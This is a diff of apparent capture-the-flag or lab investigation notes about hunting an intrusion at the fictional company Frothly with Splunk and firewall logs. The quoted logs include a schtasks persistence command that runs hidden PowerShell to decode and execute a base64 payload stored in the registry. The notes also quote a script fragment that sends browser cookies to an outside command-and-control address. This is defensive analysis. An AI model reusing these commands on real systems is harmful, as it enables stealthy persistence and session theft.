@@ -989,15 +989,10 @@ Three occur in time ranges expected
 ```
 2017-08-24 03:45:03	wrk-btun	FROTHLY\billy.tun	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 
 
-2017-08-24 03:45:03	wrk-btun	billy.tun	 	 	 
-
-2017-08-24 04:12:36	venus	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	 
+Two other almost identical for:
 
 2017-08-24 04:12:36	venus	service3	 	 	 
-
 2017-08-24 04:04:27	wrk-klagerf	 	 	 	 
-
-2017-08-24 04:04:26	wrk-klagerf	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 Simplify with just *schtasks* and interesting fields commandline there are 10 those, all three /admin/get.php is in first one. So sort of dead end can rule these out as only three based on the next event volume search.
 
@@ -1055,7 +1050,7 @@ sourcetype="pan:traffic" dest_ip=45.77.65.211
 
 ```
 HTTP logs = only unencrypted web traffic
-PAN logs  = all traffic (why blow is port 443 and 9999)
+PAN logs = all traffic (why below is port 443 and 9999 not 80 and 9999)
 src_ip	    dest_port	 action	       app	          count
 10.0.1.100	443	         allowed	   ssl	          11086
 10.0.1.101	443	         allowed	   ssl	          9139
@@ -1075,7 +1070,7 @@ Unencoded %coded section:
 "http://45.77.65.211:9999/microsoftuserfeedbackservice?metric="
 + document.cookie;</script>
 ```   
-Changing scan to dest_port=80 shows what appears to be a lot of traffic to 45.77.65.211 but this seem not not be beaconing purpose as its incoming. Seem be all from C2 to another internal IP 172.31.4.249, which seems to be more of attack than a on the internal site than beaconing action in place. event log is long but initially connects to send POST packets to www.brewertalk.com/member.php HTTP/1.1, with high frequency 1-3 events per second.
+Changing scan to dest_port=80 shows what appears to be a lot of traffic to 45.77.65.211 but this seem not not be beaconing purpose as its incoming from C2. Seem be all from C2 to another internal IP 172.31.4.249, which seems to be more of attack than a on the internal site than beaconing action in place. event log is long but initially connects to send POST packets to www.brewertalk.com/member.php HTTP/1.1, with high frequency 1-3 events per second.
 ```
 </head>
 <body>...		<p>MyBB has experienced an internal SQL error and cannot continue.</p><dl>
